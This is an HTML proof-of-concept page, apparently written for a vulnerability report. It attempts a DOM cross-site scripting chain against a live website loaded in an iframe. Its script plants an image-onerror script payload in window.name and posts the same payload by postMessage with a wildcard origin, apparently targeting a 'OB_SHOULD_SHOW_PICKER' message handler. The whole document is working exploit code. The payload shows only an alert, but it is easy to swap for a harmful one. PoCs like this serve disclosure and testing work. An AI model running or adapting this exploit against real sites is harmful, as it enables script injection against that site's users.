<!DOCTYPE html>
<html>
<head>
  <title>☠️ DOM XSS Chain via window.name + postMessage</title>
  <meta charset="utf-8">
  <style>
    body {
      font-family: sans-serif;
      background: #f4f4f4;
      padding: 30px;
    }
    iframe {
      border: 2px solid #888;
      width: 100%;
      height: 500px;
    }
  </style>
</head>
<body>
  <h1>🚨 DOM XSS Chain via <code>window.name</code> + <code>postMessage</code></h1>
  <p>Sending exploit via window.name and postMessage...</p>

  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>

  <script>
    const payload = `<img src=x onerror="alert('🔥 XSS via window.name + postMessage')">`;

    // Inject payload into window.name
    window.name = JSON.stringify({
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: [payload]
      }
    });

    // Also send postMessage
    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("✅ iframe loaded");
      setTimeout(() => {
        console.log("🚀 Sending XSS payload via postMessage...");
        iframe.contentWindow.postMessage({
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: [payload]
          }
        }, "*");
      }, 1000);
    };
  </script>
</body>
</html>
